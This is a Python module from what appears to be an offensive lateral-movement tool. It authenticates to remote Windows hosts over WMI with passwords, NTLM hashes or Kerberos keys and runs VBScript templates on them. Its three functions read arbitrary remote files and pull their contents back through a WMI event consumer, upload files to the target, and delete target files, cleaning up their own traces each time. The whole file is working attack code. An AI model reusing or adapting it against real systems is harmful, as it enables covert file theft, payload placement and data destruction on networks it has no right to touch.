from module import *
from module import wmiconnect
from module import vbsrun
from io import StringIO
import uuid
import os
import sys
import base64
import binascii
import time

def readfile(ip='', username='', password='',domain='',hashes='',aesKey='',targetfile='',savetofile=''):
    teamplevbs_path=os.path.join(os.getcwd(),"vbs","readfile.vbs")
    outputvbs_path=os.path.join(os.getcwd(),"output","readfile.vbs")
    uid=str(uuid.uuid1())
    vbsid=str(uuid.uuid1())
    remote_filepath_notfound_id="UmFpZEVuTWVpOllvdSBhcmUgcHJvbXB0ZWQgdGhhdCB0aGUgZmlsZSBkb2VzIG5vdCBleGlzdA=="
    print("[*] ip:{}@{} -> {}".format(ip,targetfile,savetofile))
    tmp=open(teamplevbs_path,"r",encoding="utf-8").read().replace("AAAAAAAAAAAAAAAAAAAAA",base64.b64encode(targetfile.encode()).decode()).replace("BBBBBBBBBBBBBBBBBBBBBBB",uid)
    newfile=open(outputvbs_path,"w",encoding="utf-8")
    newfile.write(tmp)
    newfile.close()
    vbsrun.run_vbs(ip, username, password, domain, hashes, aesKey, outputvbs_path, vbsid)
    dcom, iWbemLevel1Login = wmiconnect.wmiconnect(ip, username, password, domain, hashes, aesKey)
    iWbemLevel1Login.RemRelease()
    iWbemServices2 = iWbemLevel1Login.NTLMLogin('//./root/subscription', NULL, NULL)
    # while死循环判断vbs不用写文件判断，爽
    while True:
        try:
            readscript, _ = iWbemServices2.GetObject('ActiveScriptEventConsumer.Name="{}"'.format(uid))
            break
        except Exception as error:
            if "WBEM_E_NOT_FOUND" in str(error):
                pass
            else:
                print(error)
    fileodata = base64.b64decode(readscript.ScriptText)
    if readscript.ScriptText==remote_filepath_notfound_id:
        print(fileodata.decode())
    else:
        print("[*] filedat size:{}".format(len(fileodata)))
        wb=open(savetofile,"wb")
        wb.write(fileodata)
        wb.close()
        print("[+] save to file sucess")
    vbsrun.delete(ip, username, password, domain, hashes, aesKey,vbsid)


def WriteFile(ip, username, password, domain, hashes, aesKey,targetfile,savetofile):
    if os.path.exists(targetfile)==False:
        print("[-] File:{} Not Found".format(targetfile))
        exit()
    print("[*] upload file:{} -> save to filepath:{}".format(targetfile,savetofile))
    filedata=binascii.hexlify(open(targetfile,"rb").read()).decode()
    vbsid=str(uuid.uuid1())
    teamplevbs=os.path.join(os.getcwd(),"vbs","writeFile.vbs")
    outfilevbs=os.path.join(os.getcwd(),"output","writeFile.vbs")
    tmp=open(teamplevbs,"r",encoding="utf-8").read().replace("AAAAAAAAAAAAAAAAAAAAAAAAA",filedata).replace("BBBBBBBBBBBBBBBBBBBBBBB",base64.b64encode(savetofile.encode()).decode())
    newfile=open(outfilevbs,"w",encoding="utf-8")
    newfile.write(tmp)
    newfile.close()
    #想这种vbs调用组件IO写文件，拥有阻塞性，执行如果没执行完的话会一直阻塞，相当于变向判断了文件是否成功写入(大文件可以，小文件翻车，重复不行，还是延迟，操)

    current = sys.stdout
    sys.stdout = StringIO()
    vbsrun.run_vbs(ip, username, password, domain, hashes, aesKey,outfilevbs,vbsid)
    sys.stdout=current
    time.sleep(2.5)
    vbsrun.delete(ip, username, password, domain, hashes, aesKey,vbsid)
    print("[*] write file vbs run Finish")

def deletefile(ip, username, password, domain, hashes, aesKey,targetfile):
    teamplevbs_path = os.path.join(os.getcwd(), "vbs", "delete_file.vbs")
    outputvbs_path = os.path.join(os.getcwd(), "output", "delete_file.vbs")
    vbsid = str(uuid.uuid1())
    temp=open(teamplevbs_path,"r",encoding="utf-8").read()
    temp=temp.replace("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", base64.b64encode(targetfile.encode()).decode())
    newfile = open(outputvbs_path, "w", encoding="utf-8")
    newfile.write(temp)
    newfile.close()
    vbsrun.run_vbs(ip, username, password, domain, hashes, aesKey, outputvbs_path, vbsid)
    time.sleep(2.5)
    vbsrun.delete(ip, username, password, domain, hashes, aesKey, vbsid)
    print("[*] Delete file:{} sucess".format(targetfile))